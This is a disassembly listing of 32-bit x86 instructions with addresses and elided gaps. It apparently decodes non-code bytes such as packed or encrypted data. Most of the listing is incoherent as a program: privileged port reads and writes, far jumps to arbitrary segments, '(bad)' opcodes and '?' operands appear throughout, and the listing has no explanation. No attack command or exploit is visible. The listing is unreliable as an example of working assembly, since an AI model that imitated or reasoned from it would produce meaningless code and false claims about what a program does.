  42f2c6:	mov    BYTE PTR [esi-0x48c826d4],dl
  42f2cc:	inc    edi
  42f2cd:	xor    ebp,DWORD PTR [eax]
  42f2cf:	std    
  42f2d0:	sub    eax,0x75284be0
  42f2d5:	sar    esi,0x24
  42f2d8:	xor    BYTE PTR es:[ebx],ch
  42f2db:	cdq    
  42f2dc:	xchg   ebp,eax
  42f2dd:	push   edi
  42f2de:	es mov dh,0x17
  42f2e1:	mov    eax,0x2400f7a
  42f2e6:	out    0x30,al
  42f2e8:	stc    
  42f2e9:	fwait
  42f2ea:	pop    esi
  42f2eb:	pop    es
  42f2ec:	cmp    al,dl
  42f2ee:	into   
  42f2ef:	jge    0x42f2a7
  42f2f1:	ds jl  0x42f27c
  42f2f4:	push   esp
  42f2f5:	stos   DWORD PTR es:[edi],eax
  42f2f6:	pop    ebp
  42f2f7:	or     DWORD PTR [ecx-0x448dcf8c],ecx
  42f2fd:	out    0x21,ax
  42f300:	out    0x7c,eax
  42f302:	mov    ebx,edx
  42f304:	lock pop edx
  42f306:	scas   eax,DWORD PTR es:[edi]
  42f307:	mov    eax,0x912e89ba
  42f30c:	stc    
  42f30d:	lods   eax,DWORD PTR ds:[esi]
  42f30e:	or     BYTE PTR [edx],dl
  42f310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	in     eax,dx
  42f381:	adc    ebp,DWORD PTR [edi+0x5c]
  42f384:	mov    edi,edx
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0xa8000001
  42f38d:	jge    0x42f3de
  42f38f:	mov    al,0xd8
  42f391:	imul   esi,DWORD PTR [esi],0x350f68bf
  42f397:	sbb    dl,dh
  42f399:	push   0x18
  42f39b:	jl     0x42f3b6
  42f39d:	fucomp st(2)
  42f39f:	inc    ebx
  42f3a0:	and    BYTE PTR [edx],bh
  42f3a2:	jb     0x42f3f5
  42f3a4:	imul   ecx,DWORD PTR [ebx],0x5e
  42f3a7:	fcom   QWORD PTR [eax+0x16]
  42f3aa:	ret    0x326a
  42f3ad:	sub    DWORD PTR [ebp+eax*8+0x4f],ecx
  42f3b1:	xchg   esi,eax
  42f3b2:	cs and dh,bh
  42f3b5:	sub    eax,0xae00386b
  42f3ba:	dec    esi
  42f3bb:	pop    edi
  42f3bc:	xchg   esp,eax
  42f3bd:	rol    DWORD PTR [eax+ecx*4],cl
  42f3c0:	(bad)  
  42f3c1:	cli    
  42f3c2:	xor    DWORD PTR [eax+0x7cd65a8a],0xffffff87
  42f3c9:	xor    al,0xd9
  42f3cb:	cwde   
  42f3cc:	inc    edi
  42f3cd:	call   0xb31e890e
  42f3d2:	sub    cl,BYTE PTR [esi]
  42f3d4:	jmp    0xc7dc:0x1f01e836
  42f3db:	test   al,0xd9
  42f3dd:	dec    ebp
  42f3de:	into   
  42f3df:	adc    edi,DWORD PTR [edx]
  42f3e1:	xchg   esi,eax
  42f3e2:	cmp    BYTE PTR [eax],dl
  42f3e4:	gs sub eax,0xda25a5f8
  42f3ea:	and    DWORD PTR ds:[edx+eiz*2],edx
  42f3ee:	lods   eax,DWORD PTR ds:[esi]
  42f3ef:	and    BYTE PTR [esi+0x67],bl
  42f3f2:	retf   
  42f3f3:	sub    al,0x79
  42f3f5:	push   eax
  42f3f6:	inc    eax
  42f3f7:	sahf   
  42f3f8:	outs   dx,DWORD PTR ds:[esi]
  42f3f9:	call   0x1c2192ee
  42f3fe:	leave  
  42f3ff:	pop    edx
  42f400:	pop    es
  42f401:	imul   eax,DWORD PTR ds:0x2e198d0a,0x8bcf7b81
  42f40b:	daa    
  42f40c:	int    0xc7
  42f40e:	adc    BYTE PTR [esp+edi*2-0x6d9faa8e],dl
  42f415:	cmc    
  42f416:	and    DWORD PTR [ebx],ebp
  42f418:	sti    
  42f419:	or     eax,0x1fd6f41e
  42f41e:	sbb    al,0x97
  42f420:	pop    eax
  42f421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f422:	xor    eax,0x1af4b752
  42f427:	rcr    cl,cl
  42f429:	jb     0x42f3f2
  42f42b:	cmp    ebx,DWORD PTR [eax+0x2038950]
  42f431:	aad    0x87
  42f433:	inc    edx
  42f434:	int    0x9a
  42f436:	fucom  st(6)
  42f438:	psraw  mm3,QWORD PTR [ecx]
  42f43b:	sbb    al,0x6d
  42f43d:	and    eax,0x2ccaa7d9
  42f442:	pop    ebp
  42f443:	test   BYTE PTR [ebp+0x27bbd0bb],0x8d
  42f44a:	jbe    0x42f3ce
  42f44c:	mov    ch,0x31
  42f44e:	push   ebx
  42f44f:	xchg   BYTE PTR [eax-0x36],dl
  42f452:	jne    0x42f477
  42f454:	dec    ebp
  42f455:	enter  0xbf3e,0xd1
  42f459:	dec    edx
  42f45a:	mov    eax,ds:0x72ac452c
  42f45f:	dec    esi
  42f460:	es imul ebx,ebp,0xbbf46434
  42f467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f468:	pop    esi
  42f469:	xchg   ebp,eax
  42f46a:	mov    bh,0xa5
  42f46c:	sar    ax,1
  42f46f:	je     0x42f4d1
  42f471:	cli    
  42f472:	cwde   
  42f473:	pop    esi
  42f474:	and    eax,0xae45b926
  42f479:	mov    ch,0x76
  42f47b:	xor    edi,DWORD PTR [ebx]
  42f47d:	jecxz  0x42f4da
  42f47f:	push   esp
  42f480:	or     ebp,eax
  42f482:	sub    eax,0xefcda8bf
  42f487:	adc    ebx,DWORD PTR [eax+0xc]
  42f48a:	sub    eax,0x692cc93d
  42f48f:	popa   
  42f490:	mov    eax,ds:0x0
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	mov    dh,0x55
  42f502:	inc    eax
  42f503:	jg     0x42f495
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x67000001
  42f50d:	fdiv   DWORD PTR [ecx]
  42f50f:	mov    edi,0xb9000a96
  42f514:	sub    eax,0xc1a2f36c
  42f519:	jp     0x42f4c7
  42f51b:	pop    ebp
  42f51c:	shr    DWORD PTR [ebx],0xb
  42f51f:	cmp    ecx,DWORD PTR [esi-0x51467fad]
  42f525:	daa    
  42f526:	out    0x3a,eax
  42f528:	adc    eax,0xbac82bed
  42f52d:	inc    DWORD PTR [esi+0x21]
  42f530:	bound  edx,QWORD PTR [edx-0x4fc44e84]
  42f536:	pop    esp
  42f537:	call   0x1fcf:0x7a1e6ed8
  42f53e:	fimul  WORD PTR [edi]
  42f540:	jne    0x42f590
  42f542:	cld    
  42f543:	dec    ebp
  42f544:	adc    bl,BYTE PTR [esi+0x41]
  42f547:	daa    
  42f548:	gs pop esp
  42f54a:	and    BYTE PTR [ecx-0x26cc81c4],dh
  42f550:	sub    al,0x2a
  42f552:	sbb    esp,edi
  42f554:	mov    ch,0x89
  42f556:	shl    BYTE PTR [ebx-0x265d82b],0x81
  42f55d:	dec    ebx
  42f55e:	jns    0x42f5b7
  42f560:	in     al,0xc5
  42f562:	iret   
  42f563:	repnz pop esi
  42f565:	push   edi
  42f566:	xor    esi,esp
  42f568:	dec    edx
  42f569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f56a:	pop    ebp
  42f56b:	add    BYTE PTR [ebx-0x3eb30844],cl
  42f571:	outs   dx,BYTE PTR ds:[esi]
  42f572:	std    
  42f573:	xlat   BYTE PTR ds:[ebx]
  42f574:	ret    
  42f575:	fdiv   QWORD PTR [edx+0x4e]
  42f578:	jl     0x42f5e0
  42f57a:	cmp    ebx,DWORD PTR [edi+0x302cbb8e]
  42f580:	adc    BYTE PTR [eax+0x426d396e],dl
  42f586:	in     al,dx
  42f587:	add    bh,bh
  42f589:	mov    edi,0x69b4e4cd
  42f58e:	dec    edx
  42f58f:	gs ins BYTE PTR es:[edi],dx
  42f591:	ss pushf 
  42f593:	lea    ecx,[ecx-0x62]
  42f596:	cmp    BYTE PTR [eax-0x618ac605],al
  42f59c:	adc    DWORD PTR [edi+eiz*8-0x61],eax
  42f5a0:	repnz adc al,0x5f
  42f5a3:	ret    0xf85d
  42f5a6:	sahf   
  42f5a7:	leave  
  42f5a8:	jno    0x42f52d
  42f5aa:	cdq    
  42f5ab:	xchg   BYTE PTR [ecx+0xeaab07c],ch
  42f5b1:	cmp    DWORD PTR [eax-0x5964b7b3],0xffffffac
  42f5b8:	jb     0x42f5e0
  42f5ba:	sbb    BYTE PTR [edi+eax*4],0x47
  42f5be:	ja     0x42f623
  42f5c0:	xchg   ebp,eax
  42f5c1:	dec    eax
  42f5c2:	sub    dl,BYTE PTR [ebx+0x76e9b138]
  42f5c8:	mov    ds:0xd9959735,eax
  42f5cd:	fsubr  st,st(7)
  42f5cf:	popa   
  42f5d0:	push   cs
  42f5d1:	or     ch,BYTE PTR [eax-0x540851e0]
  42f5d7:	aam    0xd4
  42f5d9:	and    edi,DWORD PTR [ebx*4+0x71aa5c4f]
  42f5e0:	cmp    cl,al
  42f5e2:	xor    BYTE PTR [eax+0x1b],cl
  42f5e5:	lock or ch,ch
  42f5e8:	push   cs
  42f5e9:	into   
  42f5ea:	popf   
  42f5eb:	fldpi  
  42f5ed:	test   al,0x9c
  42f5ef:	out    0xae,al
  42f5f1:	int    0xa2
  42f5f3:	cdq    
  42f5f4:	lock mov ecx,esp
  42f5f7:	mov    eax,ds:0x65750043
  42f5fc:	inc    edi
  42f5fd:	test   BYTE PTR [edx+ebx*4],0x95
  42f601:	mov    ds:0x8e2c03c7,eax
  42f606:	xor    eax,0x5101a18c
  42f60b:	mov    ds:0x7eda0665,eax
  42f610:	lds    eax,FWORD PTR [eax]
	...
  42f672:	add    BYTE PTR [eax],al
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	and    eax,0x958d41de
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x29000001
  42f68d:	mov    ecx,ebp
  42f68f:	mov    ebp,0x16fba706
  42f694:	mov    ds:0x26baf9bb,al
  42f699:	ins    DWORD PTR es:[edi],dx
  42f69a:	dec    esi
  42f69b:	in     al,dx
  42f69c:	ins    DWORD PTR es:[edi],dx
  42f69d:	mov    ds:0x976c7220,eax
  42f6a2:	ret    
  42f6a3:	push   DWORD PTR [esi]
  42f6a5:	cs into 
  42f6a7:	lods   eax,DWORD PTR ds:[esi]
  42f6a8:	and    bh,bh
  42f6aa:	xchg   al,bl
  42f6ac:	jae    0x42f657
  42f6ae:	mov    ebp,0xbfa63c22
  42f6b3:	dec    ebp
  42f6b4:	push   ds
  42f6b5:	inc    ebx
  42f6b6:	fwait
  42f6b7:	cvtps2pi mm5,QWORD PTR [eax+0x5d]
  42f6bb:	enter  0xfd23,0x99
  42f6bf:	dec    ebp
  42f6c0:	repz gs inc ebx
  42f6c3:	retf   0x648e
  42f6c6:	pop    ebx
  42f6c7:	cdq    
  42f6c8:	mov    esp,0x34e09909
  42f6cd:	sub    bh,ch
  42f6cf:	enter  0x6995,0x58
  42f6d3:	or     ebp,ebx
  42f6d5:	imul   esi,DWORD PTR [ebp-0x6ec85778],0x1c
  42f6dc:	mov    ecx,0xb9f801e8
  42f6e1:	dec    esi
  42f6e2:	in     eax,dx
  42f6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6e4:	and    esp,ebp
  42f6e6:	aas    
  42f6e7:	ja     0x42f700
  42f6e9:	inc    ebx
  42f6ea:	mov    ecx,0xdffecbe9
  42f6ef:	sub    DWORD PTR [eax+ebx*1],0xb80acb53
  42f6f6:	sbb    al,0x47
  42f6f8:	jb     0x42f75e
  42f6fa:	xchg   ebp,eax
  42f6fb:	xchg   si,ax
  42f6fd:	add    ebp,ebx
  42f6ff:	jmp    0x75f9fd9
  42f704:	xor    eax,0xd3a6907d
  42f709:	bound  eax,QWORD PTR [ecx]
  42f70b:	fistp  QWORD PTR [edi]
  42f70d:	or     DWORD PTR [ebx-0x57],eax
  42f710:	push   ds
  42f711:	sar    DWORD PTR [edi],0xbc
  42f714:	adc    DWORD PTR [ecx+0x6b507aeb],0xffffff81
  42f71b:	mov    ebx,0xababb424
  42f720:	das    
  42f721:	dec    esi
  42f722:	lods   eax,DWORD PTR ds:[esi]
  42f723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f724:	push   0x20
  42f726:	xchg   ebx,eax
  42f727:	mov    ch,BYTE PTR [ebx]
  42f729:	fnstsw WORD PTR ds:0xf29b41a1
  42f72f:	ins    BYTE PTR es:[edi],dx
  42f730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f731:	push   edx
  42f732:	jb     0x42f6fb
  42f734:	and    esp,DWORD PTR [esi+0x54]
  42f737:	mov    ?,WORD PTR [edx+0x30bf2390]
  42f73d:	jae    0x42f6d3
  42f73f:	jg     0x42f770
  42f741:	int3   
  42f742:	mov    WORD PTR [eax+0x7061f820],ds
  42f748:	push   0xf69fcd7a
  42f74d:	sbb    dl,BYTE PTR [edi-0x75]
  42f750:	dec    esi
  42f751:	pop    ebx
  42f752:	int3   
  42f753:	xlat   BYTE PTR ds:[ebx]
  42f754:	xchg   edi,eax
  42f755:	shufps xmm1,XMMWORD PTR [ecx+ebp*2],0x80
  42f75a:	scas   eax,DWORD PTR es:[edi]
  42f75b:	pop    eax
  42f75c:	into   
  42f75d:	enter  0x318a,0x24
  42f761:	sub    BYTE PTR [eax+0x1af5018b],bl
  42f767:	xor    edx,DWORD PTR [ecx-0x70800b40]
  42f76d:	mov    DWORD PTR [ebx],0x2f9afea6
  42f773:	mov    ah,0xc0
  42f775:	adc    BYTE PTR ds:0x6dcaa7c0,bh
  42f77b:	jae    0x42f71a
  42f77d:	dec    edx
  42f77e:	add    BYTE PTR [ecx+0x64aebd35],ah
  42f784:	mov    ecx,esi
  42f786:	adc    ecx,esp
  42f788:	and    ecx,esp
  42f78a:	jb     0x42f773
  42f78c:	mov    ebp,0xb2bc71df
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xd9156278
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [esi],cl
  42f80d:	pop    es
  42f80e:	or     eax,0xb082a2ff
  42f813:	out    dx,eax
  42f814:	lock in al,0xd8
  42f817:	retf   
  42f818:	xor    al,0x57
  42f81a:	inc    ebx
  42f81b:	mov    ebp,0x98c760b5
  42f820:	out    0xc6,eax
  42f822:	in     eax,dx
  42f823:	jp     0x42f854
  42f825:	aas    
  42f826:	pop    esi
  42f827:	lods   eax,DWORD PTR ds:[esi]
  42f828:	jl     0x42f846
  42f82a:	push   eax
  42f82b:	and    BYTE PTR [eax+ecx*4-0xd],0x60
  42f830:	jbe    0x42f89d
  42f832:	pop    esi
  42f833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f834:	cmp    DWORD PTR [ecx],edx
  42f836:	(bad)  
  42f837:	pop    ecx
  42f838:	es or  eax,0xeb8cf97f
  42f83e:	cmc    
  42f83f:	pop    edi
  42f840:	retf   
  42f841:	push   ss
  42f842:	mov    bl,0xf5
  42f844:	fucomi st,st(6)
  42f846:	stos   DWORD PTR es:[edi],eax
  42f847:	sbb    ah,al
  42f849:	rcl    ebp,cl
  42f84b:	sbb    DWORD PTR [ecx-0x15],eax
  42f84e:	cmp    bl,dh
  42f850:	lahf   
  42f851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f853:	out    dx,eax
  42f854:	cmp    BYTE PTR [edx+0x13],ah
  42f857:	fdivr  st,st(3)
  42f859:	in     eax,dx
  42f85a:	(bad)  
  42f85b:	stc    
  42f85c:	retf   
  42f85d:	test   BYTE PTR ds:[edi+edx*4],ch
  42f861:	iret   
  42f862:	push   0xfffffff3
  42f864:	leave  
  42f865:	push   ebx
  42f866:	(bad)  
  42f868:	add    eax,0x7d8f6c7c
  42f86d:	push   esi
  42f86e:	call   0xbc6b3a90
  42f873:	neg    DWORD PTR [esi-0x508b7cea]
  42f879:	inc    ecx
  42f87a:	sub    dh,al
  42f87c:	fstp   DWORD PTR [ebp+edx*1+0x4a3443d4]
  42f883:	scas   eax,DWORD PTR es:[edi]
  42f884:	mov    al,ds:0xa990e1ec
  42f889:	into   
  42f88a:	bound  esi,QWORD PTR [edi+0x6a]
  42f88d:	daa    
  42f88e:	loopne 0x42f82d
  42f890:	cmp    ebp,DWORD PTR [edx]
  42f892:	imul   ebx
  42f894:	cmp    cl,BYTE PTR [edi+0x4f8b5645]
  42f89a:	lds    eax,FWORD PTR [ebx]
  42f89c:	fimul  DWORD PTR [esi+edi*1+0x7]
  42f8a0:	and    eax,DWORD PTR [ebx]
  42f8a2:	or     eax,0x883a0cbe
  42f8a7:	out    0xae,al
  42f8a9:	xor    eax,0x6d1cb2ab
  42f8ae:	into   
  42f8af:	jnp    0x42f8e9
  42f8b1:	mov    eax,ds:0xf1d13301
  42f8b6:	icebp  
  42f8b7:	xchg   ebx,esi
  42f8b9:	sbb    BYTE PTR [edi],ch
  42f8bb:	adc    al,0x49
  42f8bd:	mov    dl,ah
  42f8bf:	cmp    ebx,esi
  42f8c1:	add    al,0x74
  42f8c3:	inc    ebx
  42f8c4:	repnz inc ebp
  42f8c6:	cs dec eax
  42f8c8:	and    al,0x2a
  42f8ca:	sub    eax,DWORD PTR [eax-0x71]
  42f8cd:	pop    ebp
  42f8ce:	retf   
  42f8cf:	popa   
  42f8d0:	clc    
  42f8d1:	xchg   dh,bh
  42f8d3:	in     al,0x8e
  42f8d5:	push   eax
  42f8d6:	xor    BYTE PTR [edi],cl
  42f8d8:	fild   QWORD PTR [ebp+esi*8+0xcb7b021]
  42f8df:	jmp    0x978b:0x6a8f46ca
  42f8e6:	push   0x3c
  42f8e8:	retf   0x20bf
  42f8eb:	into   
  42f8ec:	mov    ebx,0x8dc92735
  42f8f1:	and    al,BYTE PTR [edi-0xd]
  42f8f4:	sbb    esp,edi
  42f8f6:	hlt    
  42f8f7:	in     al,0x2d
  42f8f9:	mov    DWORD PTR [eax-0x11],esp
  42f8fc:	fwait
  42f8fd:	inc    ebx
  42f8fe:	enter  0x5ea8,0x6
  42f902:	and    DWORD PTR [eax+0x7d],eax
  42f905:	out    0xf3,al
  42f907:	mov    ds:0xc970dadd,al
  42f90c:	js     0x42f97c
  42f90e:	sub    edi,DWORD PTR [edi+0xda]
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f91e
  42f981:	xchg   edi,eax
  42f982:	pop    ds
  42f983:	(bad)  
  42f984:	lahf   
  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0xed000001,al
  42f98d:	test   BYTE PTR [esi-0x6e5c8e75],al
  42f993:	sti    
  42f994:	lods   eax,DWORD PTR ds:[esi]
  42f995:	cmp    eax,0xb9c2120
  42f99a:	fmul   QWORD PTR [eax]
  42f99c:	fs push edx
  42f99e:	mov    esp,0x8bccb65b
  42f9a3:	inc    ebp
  42f9a4:	mov    eax,ds:0x4f957632
  42f9a9:	or     ebx,ebx
  42f9ab:	jmp    0xd559:0x64f6725d
  42f9b2:	and    DWORD PTR [ebx],esi
  42f9b4:	mov    ah,0xfc
  42f9b6:	fwait
  42f9b7:	ds ins DWORD PTR es:[edi],dx
  42f9b9:	sbb    eax,0x46c0a171
  42f9be:	mov    edi,0xa20a6e7b
  42f9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9c4:	or     DWORD PTR [ecx-0x45b696a5],eax
  42f9ca:	adc    eax,0x6bef43fc
  42f9cf:	cwde   
  42f9d0:	mov    ebp,DWORD PTR [ecx]
  42f9d2:	icebp  
  42f9d3:	ret    0x68e
  42f9d6:	loope  0x42f96c
  42f9d8:	xor    BYTE PTR [eax+0x384ab129],dh
  42f9de:	xchg   edx,eax
  42f9df:	arpl   WORD PTR [esp+ebp*8+0x4c],ax
  42f9e3:	push   cs
  42f9e4:	mov    WORD PTR [edx-0x6b3dbe7a],ds
  42f9ea:	aam    0x86
  42f9ec:	lods   al,BYTE PTR ds:[esi]
  42f9ed:	pushf  
  42f9ee:	imul   esi,DWORD PTR [edi-0x76],0xffffff9b
  42f9f2:	loopne 0x42f9ff
  42f9f4:	loop   0x42fa4d
  42f9f6:	out    0xa2,eax
  42f9f8:	imul   ebp,DWORD PTR [esi+edi*1],0xffffffbb
  42f9fc:	in     al,0x57
  42f9fe:	mov    eax,ds:0x7ce96f9c
  42fa03:	and    cl,BYTE PTR [esp+edi*8]
  42fa06:	or     DWORD PTR [ecx-0x51],ebp
  42fa09:	test   BYTE PTR [edx+0x3de3e11b],bl
  42fa0f:	shr    DWORD PTR [esi-0x6d],1
  42fa12:	cld    
  42fa13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa14:	or     BYTE PTR [edx-0x5d],ah
  42fa17:	inc    ebx
  42fa18:	and    BYTE PTR [edi-0x61c0c66c],bl
  42fa1e:	(bad)  
  42fa1f:	ficom  WORD PTR [edi+0x6d0a9e66]
  42fa25:	outs   dx,BYTE PTR ds:[esi]
  42fa26:	mov    DWORD PTR [eax-0x3b],edi
  42fa29:	or     eax,0xe5894ce6
  42fa2e:	adc    al,0xf5
  42fa30:	xchg   edx,eax
  42fa31:	mov    eax,DWORD PTR [ebx+0x1a]
  42fa34:	push   ss
  42fa35:	cmc    
  42fa36:	sub    ebx,DWORD PTR [ebx-0x26dee529]
  42fa3c:	daa    
  42fa3d:	out    dx,eax
  42fa3e:	das    
  42fa3f:	clc    
  42fa40:	jnp    0x42faaf
  42fa42:	icebp  
  42fa43:	dec    ebx
  42fa44:	xchg   ecx,eax
  42fa45:	push   es
  42fa46:	jns    0x42f9cb
  42fa48:	pop    edx
  42fa49:	mov    DWORD PTR [edi-0x3f],ecx
  42fa4c:	ins    BYTE PTR es:[edi],dx
  42fa4d:	mov    al,ds:0x98eece0
  42fa52:	fst    QWORD PTR [esi-0x46]
  42fa55:	mov    al,0x6b
  42fa57:	pop    ss
  42fa58:	popa   
  42fa59:	gs jge 0x42fac3
  42fa5c:	and    BYTE PTR [eax+0x4c8bc9a1],cl
  42fa62:	dec    esi
  42fa63:	and    BYTE PTR [edi-0x7b],ah
  42fa66:	push   esi
  42fa67:	xor    eax,0xd052cc5f
  42fa6c:	les    ebp,FWORD PTR [edi]
  42fa6e:	adc    eax,0x486792e3
  42fa73:	xor    al,0xd5
  42fa75:	sbb    dh,BYTE PTR [ecx]
  42fa77:	pop    eax
  42fa78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa79:	aam    0x12
  42fa7b:	adc    BYTE PTR [eax],ah
  42fa7d:	xchg   esi,eax
  42fa7f:	inc    edx
  42fa80:	pop    esi
  42fa81:	popf   
  42fa82:	fistp  QWORD PTR fs:[ebx]
  42fa85:	mov    DWORD PTR [ebx],edi
  42fa87:	jle    0x42fa80
  42fa89:	cmp    eax,0xfcfc2421
  42fa8e:	scas   al,BYTE PTR es:[edi]
  42fa8f:	in     al,0x71
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	adc    DWORD PTR [ecx-0x5ba3db],0x1050001
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	imul   esp,DWORD PTR [edi+ebp*1+0x51d95879],0x3bca27f0
  42fb17:	push   ds
  42fb18:	std    
  42fb19:	add    BYTE PTR [edi],0xf5
  42fb1c:	xchg   WORD PTR [edx],ax
  42fb1f:	test   DWORD PTR [eax*4-0x9b7acd2],esi
  42fb26:	mov    edi,0x3cae0545
  42fb2b:	mov    esp,0x75831d6e
  42fb30:	ins    BYTE PTR es:[edi],dx
  42fb31:	jg     0x42fb01
  42fb33:	fdivr  QWORD PTR [ebx]
  42fb35:	jg     0x42fb58
  42fb37:	out    dx,al
  42fb38:	daa    
  42fb39:	jmp    0x104d8d68
  42fb3e:	inc    edi
  42fb3f:	int    0x49
  42fb41:	scas   eax,DWORD PTR es:[edi]
  42fb42:	arpl   WORD PTR [esi+0xd],sp
  42fb45:	add    eax,0xf140377
  42fb4a:	(bad)  
  42fb4c:	or     DWORD PTR [edi-0x29],0x3c6e98d
  42fb53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb54:	mov    dh,0x3b
  42fb56:	shr    DWORD PTR [ebp+edi*4+0x51],cl
  42fb5a:	or     cl,BYTE PTR [edx]
  42fb5c:	jl     0x42fb9d
  42fb5e:	rcl    DWORD PTR [edi-0x2c7da623],1
  42fb64:	dec    ebx
  42fb65:	mov    ch,0xe0
  42fb67:	mov    cl,0xa5
  42fb69:	mov    ecx,0x9784c5a9
  42fb6e:	push   ecx
  42fb6f:	mov    ecx,0x4d1735c8
  42fb74:	loope  0x42fbc3
  42fb76:	push   ds
  42fb77:	jmp    0x33082a37
  42fb7c:	aam    0xb
  42fb7e:	sub    BYTE PTR [esi+0x63],dl
  42fb81:	xor    edx,DWORD PTR [edx+0x47]
  42fb84:	dec    esp
  42fb85:	(bad)  
  42fb86:	loopne 0x42fb80
  42fb88:	add    dl,dh
  42fb8a:	mov    ecx,0x75cddee1
  42fb8f:	mov    ds:0xc90171e0,eax
  42fb94:	pop    edx
  42fb95:	neg    BYTE PTR [ecx]
  42fb97:	fisub  WORD PTR [ecx+eiz*4-0x43]
  42fb9b:	ds lahf 
  42fb9d:	xchg   esi,eax
  42fb9e:	mov    edi,0x19693b16
  42fba3:	inc    eax
  42fba4:	dec    esi
  42fba5:	add    cl,bl
  42fba7:	jo     0x42fbaa
  42fba9:	mov    edx,0x7da7df45
  42fbae:	mov    ds:0xd79b6244,eax
  42fbb3:	and    eax,0xb29c721
  42fbb8:	repz xor DWORD PTR [edx],edi
  42fbbb:	dec    ebp
  42fbbc:	pop    ds
  42fbbd:	lods   al,BYTE PTR ds:[esi]
  42fbbe:	cdq    
  42fbbf:	sub    bl,BYTE PTR [eax+0x3816b840]
  42fbc5:	aaa    
  42fbc6:	test   esi,ecx
  42fbc8:	(bad)  
  42fbc9:	popa   
  42fbca:	jae    0x42fb7c
  42fbcc:	fucomip st,st(1)
  42fbce:	cmp    dl,BYTE PTR [esp+eiz*4+0x75]
  42fbd2:	mov    bh,0x91
  42fbd4:	test   al,0x2c
  42fbd6:	jp     0x42fc41
  42fbd8:	mov    DWORD PTR [edi-0x6eaee98d],esi
  42fbde:	xchg   edx,eax
  42fbdf:	jg     0x42fc56
  42fbe1:	out    dx,al
  42fbe2:	iret   
  42fbe3:	or     edi,DWORD PTR [edx+0x70]
  42fbe6:	sbb    dl,BYTE PTR [ebx+0x441d41c7]
  42fbec:	in     al,0x67
  42fbee:	and    dl,BYTE PTR [eax+eax*8-0x68fc425]
  42fbf5:	inc    ebp
  42fbf6:	lea    ecx,[ecx]
  42fbf8:	jecxz  0x42fc20
  42fbfa:	cwde   
  42fbfb:	nop
  42fbfc:	scas   eax,DWORD PTR es:[edi]
  42fbfd:	push   edi
  42fbfe:	adc    esi,DWORD PTR [esi+0x50bc8255]
  42fc04:	retfw  0x76cb
  42fc08:	xlat   BYTE PTR ds:[ebx]
  42fc09:	mov    cl,0x31
  42fc0b:	scas   eax,DWORD PTR es:[edi]
  42fc0c:	hlt    
  42fc0d:	fiadd  WORD PTR [edi-0x1a]
  42fc10:	out    0x0,al
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR ds:0xa95a650e,ch
  42fc85:	add    BYTE PTR [edx],al
  42fc87:	add    BYTE PTR ds:0xb8000001,al
  42fc8d:	or     DWORD PTR ds:0xf9cc255f,eax
  42fc93:	pop    esi
  42fc94:	mov    ebx,0x6e39f9b9
  42fc99:	(bad)  
  42fc9a:	jmp    0x42fcb3
  42fc9c:	xor    al,0x2b
  42fc9e:	jle    0x42fcdf
  42fca0:	xchg   esi,eax
  42fca1:	dec    edi
  42fca2:	add    BYTE PTR [esi],dh
  42fca4:	pop    edi
  42fca5:	mov    ?,WORD PTR [eax]
  42fca7:	mov    ebp,0x2a49a4ef
  42fcac:	mov    bl,0xce
  42fcae:	cmp    al,0x32
  42fcb0:	arpl   WORD PTR ds:0x561bd8e8,di
  42fcb6:	or     al,0xd1
  42fcb8:	mov    cl,0x2b
  42fcba:	sbb    al,0x59
  42fcbc:	aaa    
  42fcbd:	test   eax,0xc5c50140
  42fcc2:	mov    edi,eax
  42fcc4:	add    cl,BYTE PTR [ecx-0x59]
